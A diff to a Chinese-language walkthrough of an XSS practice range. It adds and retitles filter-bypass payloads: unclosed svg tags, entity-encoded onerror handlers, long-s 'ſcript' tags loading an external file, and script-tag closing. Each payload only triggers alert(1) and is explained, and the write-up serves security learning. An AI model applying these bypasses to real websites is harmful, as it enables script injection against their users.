@@ -539,7 +539,7 @@ alert(1)-->  // 使用 HTML 注释符
 --!><script>alert(1)</script>
 ```
 
-### 11.7 0x06 - 正则过滤 auto/on.*=/>/ig
+### 11.7 0x06 - 正则过滤 auto/on.*=/>/ig，点击触发
 
 ```javascript
 onfocus
@@ -548,10 +548,10 @@ onfocus
 
 **原理**：换行符会打断正则表达式 `on.*=` 中 `.*` 的连续匹配。
 
-### 11.8 0x07 - 过滤所有标签
+### 11.8 0x07 - 过滤所有标签，使用不闭合标签加回车
 
 ```javascript
-<svg/onload=alert(1)>
+<svg/onload=alert(1)\n
 ```
 
 **原理**：不闭合的标签不包含 `>`，因此不被正则 `<\\/?[^>]+>` 匹配。
@@ -571,7 +571,7 @@ onfocus
 http://www.segmentfault.com" onerror="alert(1)
 ```
 
-### 11.11 0x0A - URL 验证 + 实体编码
+### 11.11 0x0A - URL 验证 + 引入外部文件
 
 ```javascript
 https://www.segmentfault.com.haozi.me/j.js
@@ -579,21 +579,17 @@ https://www.segmentfault.com.haozi.me/j.js
 
 **原理**：利用靶场自带的 JS 文件 `j.js`，内容为 `alert(1)`。
 
-### 11.12 0x0B - 大写转换
+### 11.12 0x0B - 大写转换 + 实体编码绕过
 
 ```javascript
-</H1> <img src=M onerror=alert(1)>
+</H1> <img src=M onerror=&#97;&#108;&#101;&#114;&#116;(1)>
 ```
 
-### 11.13 0x0C - 过滤 script + 大写转换
+### 11.13 0x0C - 过滤 script + 大写转换 + 实体编码绕过
 
 ```javascript
-</H1> <img src onerror=alert(1)>
+</H1> <img src onerror=&#97;&#108;&#101;&#114;&#116;(1)>
 ```
-
-**其他方案**：
-- 双写 script：`</H1> <scrscriptipt src onerror=alert(1)></scrscriptipt>`
-- svg 标签：`</H1> <svg onload=alert(1)>`
 
 ### 11.14 0x0D - 过滤 <>/'" + 单行注释
 
@@ -606,22 +602,25 @@ alert(1);
 ### 11.15 0x0E - 过滤 <+字母 + 大写转换
 
 ```javascript
-<ſvg/onload=alert(1)>
+// 方案 1：大写转换 + 实体编码
+<ſvg/onload=&#97;&#108;&#101;&#114;&#116;(1)>
+// 方案 2：大写转换 + 引入外部文件
+<ſcript src=https://www.segmentfault.com.haozi.me/j.js></ſcript>
 ```
 
-### 11.16 0x0F - 实体编码 + console.error
+### 11.16 0x0F - 实体编码 + console.error——括号闭合+注释绕过
 
 ```javascript
 '),alert(1); //
 ```
 
-### 11.17 0x10 - 无过滤
+### 11.17 0x10 - window.data赋值无过滤
 
 ```javascript
 alert(1);
 ```
 
-### 11.18 0x11 - JavaScript 字符串转义
+### 11.18 0x11 - JavaScript 特殊字符串转义 + 注释绕过
 
 ```javascript
 "); alert(1) //
@@ -632,7 +631,10 @@ alert(1);
 ### 11.19 0x12 - 仅过滤双引号
 
 ```javascript
+//方案 1：双引号转义
 \");alert(1)//
+//方案 2：闭合script标签
+</script><script>alert(1)</script>
 ```
 
 **原理**：`\` 使 `\"` 变为 `"`。
